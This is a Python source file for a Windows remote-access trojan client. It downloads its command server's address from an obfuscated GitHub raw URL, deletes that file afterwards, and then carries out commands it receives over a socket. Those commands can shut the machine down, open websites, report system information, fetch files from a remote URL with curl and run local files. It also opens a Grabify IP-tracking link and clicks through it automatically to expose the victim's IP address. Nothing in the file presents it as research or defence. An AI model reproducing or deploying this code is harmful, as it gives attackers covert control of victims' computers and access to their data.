import os, subprocess, threading, socket, time, pickle, pyautogui as pya, win32api, cv2

# static val/change-able bef-deploy
# server = "192.168.10.63"
# port = 5050

def cmdTalk(command):
    cmd = subprocess.Popen(f'cmd /k "{command}"', shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE)
    out, err = cmd.communicate()
    return out

for t in range(10):
    if 'conn_inf.txt' not in os.listdir(os.getcwd()):
        cmdTalk('curl -o conn_inf.txt https://raw.githubusercontent.com/MarcusDev2/public_rep_marcus/main/asd%23nnsad000%5C%5C12%5C%3E%3E231%5C123%23(%265sa/conn_inf.txt')

    try:
        with open('conn_inf.txt', 'r') as file:
            data = file.read().splitlines()
            data2 = []
            for line in data:
                data2.append(line.split('- ')[1])
            server = data2[0]
            port = int(data2[1])
            print('info uploded')
        win32api.DeleteFile(file.name)
        break
    except:
        pass

print(server, port)

static_conn = False

coder = "utf-8"
buffer = 1024

DISCONNECT_MSG = "!DISCONNECT"

svd_f = 'log.txt'

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Connection ast.
try:
    client.connect((server, port))
    static_conn = True
    with open(svd_f, 'wb') as file:
        pickle.dump((server, port), file)
except:
    pass

if not static_conn:
    if svd_f in os.listdir(os.getcwd()):
        with open(svd_f, 'rb') as file:
            try_server_data = pickle.load(file)
            server, port = try_server_data
        try:
            client.connect((server, port))
        except:
            server = input('server ip: ')
            port = int(input('port: '))
            client.connect((server, port))

    if svd_f not in os.listdir(os.getcwd()):
        server = input('server ip: ')
        port = int(input('port: '))
        client.connect((server, port))
        with open(svd_f, 'wb') as file:
            pickle.dump((server, port), file)


connected = True

def send(msg):
    global connected
    if msg == DISCONNECT_MSG:
        connected = False
    msg = bytes(msg, coder)
    client.send(msg)


def recv():
    global connected, server, port
    print("Listening for server cmd")
    while connected:

        msg = client.recv(buffer).decode(coder)
        if msg == 'kick':
            send(DISCONNECT_MSG)

        if 'shutdown' in msg:
            if 'shutdown -a' == msg:
                cmdTalk('shutdown -a')
            else:
                indic = msg.split(" /")[1:]
                # cmd = f"shutdown /{indic[0]} /{indic[1]} /{indic[2].split(' ')[0]} '{indic[2].split(' ')[1:]}'"
                wrnMsg = ''
                if '/c' in msg:
                    wrnMsg = msg.split('/c ')[1]
                command = f'shutdown /{indic[0]} /{indic[1]} /c "{wrnMsg}"'
                cmdTalk(command)

        if 'start' in msg:
            if 'www' in msg.split(' ')[1]:
                command = msg
            else:
                command = f'start www.{msg.split(" ")[1]}.com'
            cmdTalk(command)
        if msg == 'systeminfo':
            data = cmdTalk('systeminfo')
            data = str(data).split('\\r\\n')[1:]
            for thing in data:
                output = ''
                for ch in thing:
                    if ch != ' ':
                        output += ch
                data[data.index(thing)] = output
            send(f'system info of {client.getsockname()} / {data}')

        if 'download' in msg:
            all_files = os.listdir(os.getcwd())
            if '/' in msg:
                command = f"curl -O {msg.split(' ')[1]}"
                cmdTalk(command)
                all_newfiles = os.listdir(os.getcwd())
                print(all_files, all_newfiles)
                for file in all_newfiles:
                    if file not in all_files:
                        f_name, f_ext = os.path.splitext(file)
                        f_newname = f"{msg.split(' ')[3]}{f_ext}"
                        print(f_newname)
                        os.rename(file, f'{f_newname}')
            else:
                command = f"curl -O {msg.split(' ')[1]}"
                cmdTalk(command)
        if msg == 'grabify':
            track_url = 'https://grabify.link/HR4SP9'
            cmdTalk(f'start {track_url}')
            time.sleep(3)

            img_git_download = 'https://raw.githubusercontent.com/MarcusDev2/public_rep_marcus/main/asd%23nnsad000%5C%5C12%5C%3E%3E231%5C123%23(%265sa/grb_clc.PNG'

            ssh_name = 'screenShot.png'
            grabif_img = None
            if 'grb_clc.PNG' not in os.listdir():
                try:
                    cmdTalk(f'curl -o grb_clc.PNG {img_git_download}')
                    grabif_img = cv2.imread('grb_clc.PNG')
                except:
                    send("git/grabify img not found, couldn't download")
            else:
                grabif_img = cv2.imread('grb_clc.PNG')
            try:
                for i in range(100):
                    pya.screenshot(ssh_name)
                    screenShot = cv2.imread(ssh_name)
                    results = cv2.matchTemplate(screenShot, grabif_img, cv2.TM_CCOEFF_NORMED)
                    min_val, max_val, min_loc, max_loc = cv2.minMaxLoc(results)
                    win32api.DeleteFile(ssh_name)
                    if max_val >= 0.89:

                        pya.moveTo(max_loc)
                        pya.click()
                        send('grabify succ')
                        break
                if max_val <= 0.89:
                    send(f'grabify failed')
            except:
                pass

        if msg == 'get files':
            send(f'{os.getcwd()} files: {os.listdir(os.getcwd())}')
        if 'open' in msg:
            command = f'{os.getcwd()}\\{msg.split(" ")[1]}'
            cmdTalk(command)
        else:
            print(msg)

thred_recv = threading.Thread(target=recv)
thred_recv.start()






